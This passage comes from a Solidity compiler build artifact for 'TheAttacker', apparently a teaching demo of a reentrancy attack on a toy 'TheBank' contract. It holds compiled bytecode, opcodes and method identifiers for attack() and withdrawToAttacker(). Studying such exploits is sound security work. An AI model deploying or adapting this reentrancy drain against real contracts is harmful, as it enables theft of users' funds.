\"#utility.yul\":4435:4453   */\n      swap1\n      pop\n        /* \"#utility.yul\":4425:4459   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4465:4634   */\n    tag_75:\n      0x00\n        /* \"#utility.yul\":4583:4589   */\n      dup3\n        /* \"#utility.yul\":4578:4581   */\n      dup3\n        /* \"#utility.yul\":4571:4590   */\n      mstore\n        /* \"#utility.yul\":4623:4627   */\n      0x20\n        /* \"#utility.yul\":4618:4621   */\n      dup3\n        /* \"#utility.yul\":4614:4628   */\n      add\n        /* \"#utility.yul\":4599:4628   */\n      swap1\n      pop\n        /* \"#utility.yul\":4561:4634   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4640:4736   */\n    tag_67:\n      0x00\n        /* \"#utility.yul\":4706:4730   */\n      tag_115\n        /* \"#utility.yul\":4724:4729   */\n      dup3\n        /* \"#utility.yul\":4706:4730   */\n      tag_116\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":4695:4730   */\n      swap1\n      pop\n        /* \"#utility.yul\":4685:4736   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4742:4868   */\n    tag_116:\n      0x00\n        /* \"#utility.yul\":4819:4861   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":4812:4817   */\n      dup3\n        /* \"#utility.yul\":4808:4862   */\n      and\n        /* \"#utility.yul\":4797:4862   */\n      swap1\n      pop\n        /* \"#utility.yul\":4787:4868   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4874:4951   */\n    tag_97:\n      0x00\n        /* \"#utility.yul\":4940:4945   */\n      dup2\n        /* \"#utility.yul\":4929:4945   */\n      swap1\n      pop\n        /* \"#utility.yul\":4919:4951   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4957:5111   */\n    tag_71:\n      0x00\n        /* \"#utility.yul\":5054:5105   */\n      tag_120\n        /* \"#utility.yul\":5099:5104   */\n      dup3\n        /* \"#utility.yul\":5054:5105   */\n      tag_121\n      jump\t// in\n    tag_120:\n        /* \"#utility.yul\":5041:5105   */\n      swap1\n      pop\n        /* \"#utility.yul\":5031:5111   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5117:5244   */\n    tag_121:\n      0x00\n        /* \"#utility.yul\":5214:5238   */\n      tag_123\n        /* \"#utility.yul\":5232:5237   */\n      dup3\n        /* \"#utility.yul\":5214:5238   */\n      tag_116\n      jump\t// in\n    tag_123:\n        /* \"#utility.yul\":5201:5238   */\n      swap1\n      pop\n        /* \"#utility.yul\":5191:5244   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5250:5427   */\n    tag_77:\n        /* \"#utility.yul\":5390:5419   */\n      0x576974686472617720746f2061747461636b6572206661696c65640000000000\n        /* \"#utility.yul\":5386:5387   */\n      0x00\n        /* \"#utility.yul\":5378:5384   */\n      dup3\n        /* \"#utility.yul\":5374:5388   */\n      add\n        /* \"#utility.yul\":5367:5420   */\n      mstore\n        /* \"#utility.yul\":5356:5427   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5433:5547   */\n    tag_83:\n        /* \"#utility.yul\":5539:5547   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5553:5729   */\n    tag_88:\n        /* \"#utility.yul\":5693:5721   */\n      0x4f6e6c792061747461636b65722063616e207769746864726177000000000000\n        /* \"#utility.yul\":5689:5690   */\n      0x00\n        /* \"#utility.yul\":5681:5687   */\n      dup3\n        /* \"#utility.yul\":5677:5691   */\n      add\n        /* \"#utility.yul\":5670:5722   */\n      mstore\n        /* \"#utility.yul\":5659:5729   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5735:5958   */\n    tag_93:\n        /* \"#utility.yul\":5875:5909   */\n      0x6d7573742073656e64206174206c65617374203120657468657220746f206174\n        /* \"#utility.yul\":5871:5872   */\n      0x00\n        /* \"#utility.yul\":5863:5869   */\n      dup3\n        /* \"#utility.yul\":5859:5873   */\n      add\n        /* \"#utility.yul\":5852:5910   */\n      mstore\n        /* \"#utility.yul\":5944:5950   */\n      0x7461636b00000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":5939:5941   */\n      0x20\n        /* \"#utility.yul\":5931:5937   */\n      dup3\n        /* \"#utility.yul\":5927:5942   */\n      add\n        /* \"#utility.yul\":5920:5951   */\n      mstore\n        /* \"#utility.yul\":5841:5958   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220b4fb1b1256c7eea65b57484cee3c071b46e26524eb8049d26d697102b30286db64736f6c63430008010033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b50604051610933380380610933833981810160405281019061003291906100ce565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610140565b6000815190506100c881610129565b92915050565b6000602082840312156100e057600080fd5b60006100ee848285016100b9565b91505092915050565b600061010282610109565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610132816100f7565b811461013d57600080fd5b50565b6107e48061014f6000396000f3fe6080604052600436106100585760003560e01c8062113e081461012b5780630872dc411461015657806348eb76ee146101815780639e5faafc146101ac578063ad7a672f146101b6578063ff4707ee146101e157610126565b3661012657670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101245760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d4e932926040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010b57600080fd5b505af115801561011f573d6000803e3d6000fd5b505050505b005b600080fd5b34801561013757600080fd5b506101406101f8565b60405161014d9190610673565b60405180910390f35b34801561016257600080fd5b5061016b610200565b60405161017891906105f8565b60405180910390f35b34801561018d57600080fd5b50610196610224565b6040516101a391906105dd565b60405180910390f35b6101b461024a565b005b3480156101c257600080fd5b506101cb6103a0565b6040516101d89190610673565b60405180910390f35b3480156101ed57600080fd5b506101f66103a8565b005b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a7640000341015610295576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161028c90610653565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561030557600080fd5b505af1158015610319573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d4e932926040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561038657600080fd5b505af115801561039a573d6000803e3d6000fd5b50505050565b600047905090565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610438576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161042f90610633565b60405180910390fd5b60004790506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1682604051610485906105c8565b60006040518083038185875af1925050503d80600081146104c2576040519150601f19603f3d011682016040523d82523d6000602084013e6104c7565b606091505b505090508061050b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161050290610613565b60405180910390fd5b5050565b610518816106aa565b82525050565b610527816106e6565b82525050565b600061053a601b83610699565b91506105458261070a565b602082019050919050565b600061055d60008361068e565b915061056882610733565b600082019050919050565b6000610580601a83610699565b915061058b82610736565b602082019050919050565b60006105a3602483610699565b91506105ae8261075f565b604082019050919050565b6105c2816106dc565b82525050565b60006105d382610550565b9150819050919050565b60006020820190506105f2600083018461050f565b92915050565b600060208201905061060d600083018461051e565b92915050565b6000602082019050818103600083015261062c8161052d565b9050919050565b6000602082019050818103600083015261064c81610573565b9050919050565b6000602082019050818103600083015261066c81610596565b9050919050565b600060208201905061068860008301846105b9565b92915050565b600081905092915050565b600082825260208201905092915050565b60006106b5826106bc565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006106f1826106f8565b9050919050565b6000610703826106bc565b9050919050565b7f576974686472617720746f2061747461636b6572206661696c65640000000000600082015250565b50565b7f4f6e6c792061747461636b65722063616e207769746864726177000000000000600082015250565b7f6d7573742073656e64206174206c65617374203120657468657220746f20617460008201527f7461636b0000000000000000000000000000000000000000000000000000000060208201525056fea2646970667358221220b4fb1b1256c7eea65b57484cee3c071b46e26524eb8049d26d697102b30286db64736f6c63430008010033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x933 CODESIZE SUB DUP1 PUSH2 0x933 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xCE JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x140 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xC8 DUP2 PUSH2 0x129 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xEE DUP5 DUP3 DUP6 ADD PUSH2 0xB9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x102 DUP3 PUSH2 0x109 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x132 DUP2 PUSH2 0xF7 JUMP JUMPDEST DUP2 EQ PUSH2 0x13D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x7E4 DUP1 PUSH2 0x14F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x58 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH3 0x113E08 EQ PUSH2 0x12B JUMPI DUP1 PUSH4 0x872DC41 EQ PUSH2 0x156 JUMPI DUP1 PUSH4 0x48EB76EE EQ PUSH2 0x181 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x1AC JUMPI DUP1 PUSH4 0xAD7A672F EQ PUSH2 0x1B6 JUMPI DUP1 PUSH4 0xFF4707EE EQ PUSH2 0x1E1 JUMPI PUSH2 0x126 JUMP JUMPDEST CALLDATASIZE PUSH2 0x126 JUMPI PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x124 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD4E93292 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x10B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x11F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x137 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x140 PUSH2 0x1F8 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x14D SWAP2 SWAP1 PUSH2 0x673 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x162 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x16B PUSH2 0x200 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x178 SWAP2 SWAP1 PUSH2 0x5F8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x18D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x196 PUSH2 0x224 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1A3 SWAP2 SWAP1 PUSH2 0x5DD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x24A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1C2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1CB PUSH2 0x3A0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1D8 SWAP2 SWAP1 PUSH2 0x673 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1ED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1F6 PUSH2 0x3A8 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x295 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x28C SWAP1 PUSH2 0x653 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x305 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x319 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD4E93292 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x386 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x39A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x438 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x42F SWAP1 PUSH2 0x633 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD PUSH2 0x485 SWAP1 PUSH2 0x5C8 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x4C2 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x4C7 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x50B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x502 SWAP1 PUSH2 0x613 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH2 0x518 DUP2 PUSH2 0x6AA JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x527 DUP2 PUSH2 0x6E6 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x53A PUSH1 0x1B DUP4 PUSH2 0x699 JUMP JUMPDEST SWAP2 POP PUSH2 0x545 DUP3 PUSH2 0x70A JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x55D PUSH1 0x0 DUP4 PUSH2 0x68E JUMP JUMPDEST SWAP2 POP PUSH2 0x568 DUP3 PUSH2 0x733 JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x580 PUSH1 0x1A DUP4 PUSH2 0x699 JUMP JUMPDEST SWAP2 POP PUSH2 0x58B DUP3 PUSH2 0x736 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5A3 PUSH1 0x24 DUP4 PUSH2 0x699 JUMP JUMPDEST SWAP2 POP PUSH2 0x5AE DUP3 PUSH2 0x75F JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x5C2 DUP2 PUSH2 0x6DC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5D3 DUP3 PUSH2 0x550 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x5F2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x50F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x60D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x51E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x62C DUP2 PUSH2 0x52D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x64C DUP2 PUSH2 0x573 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x66C DUP2 PUSH2 0x596 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x688 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x5B9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x6B5 DUP3 PUSH2 0x6BC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x6F1 DUP3 PUSH2 0x6F8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x703 DUP3 PUSH2 0x6BC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x576974686472617720746F2061747461636B6572206661696C65640000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH32 0x4F6E6C792061747461636B65722063616E207769746864726177000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x6D7573742073656E64206174206C65617374203120657468657220746F206174 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x7461636B00000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xB4 0xFB SHL SLT JUMP 0xC7 0xEE 0xA6 JUMPDEST JUMPI 0x48 0x4C 0xEE EXTCODECOPY SMOD SHL CHAINID 0xE2 PUSH6 0x24EB8049D26D PUSH10 0x7102B30286DB64736F6C PUSH4 0x43000801 STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "404000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"attacker()": "1236",
						"getBalances()": "317",
						"theBank()": "1254",
						"totalBalance()": "405",
						"withdrawToAttacker()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"attacker()": "48eb76ee",
					"getBalances()": "00113e08",
					"theBank()": "0872dc41",
					"totalBalance()": "ad7a672f",
					"withdrawToAttacker()": "ff4707ee"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 84,
						"contract": "theBank.sol:TheAttacker",
						"label": "theBank",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(TheBank)81"
					},
					{
						"astId": 86,
						"contract": "theBank.sol:TheAttacker",
						"label": "attacker",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(TheBank)81": {
						"encoding": "inplace",
						"label": "contract TheBank",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}